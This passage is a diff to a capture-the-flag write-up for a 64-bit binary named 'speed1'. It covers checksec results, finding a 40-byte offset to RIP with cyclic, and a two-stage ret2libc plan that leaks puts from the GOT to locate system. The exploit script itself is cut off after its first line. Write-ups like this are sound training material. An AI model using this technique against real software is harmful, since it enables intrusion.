@@ -1,4 +1,11 @@
+This challenge ships a 64bit binary and a libc.so.6 file. So first we test the binary:
+
+![binary crashes with big input-string](segfault.png)
+
+Now we test the security of the binary:
+
 ```
+
 $ checksec ./speed1
 [*] '~/speed1'
     Arch:     amd64-64-little
@@ -7,6 +14,9 @@ $ checksec ./speed1
     NX:       NX enabled
     PIE:      No PIE (0x400000)
 ```
+
+
+We have to figure out the size of the buffer and the offset to RIP:
 
 ```
 $ cyclic -n 8 100  
@@ -27,14 +37,20 @@ $ cyclic -n 8 -l 0x6161616161616166
 40
 ```
 
+It's 40. Perfect.
+
 
 ![main address was 0x4010d0](main-address.png)
 
+
+Since there is ASLR enabled we have to find a way to figure out the address of *system*. We can use a function of the Global Offset Table for that.
 
 Using pwndbg to see the GOT entries:
 
 ![puts is in got](got-functions.png)
 
+
+Now we prepare a two stage payload. First stage finds out the address of puts via GOT. We need to calculate the address for the system-function.  The second stage delivers the ret2libc-payload:
 
 ```python
 #!/usr/bin/env python3
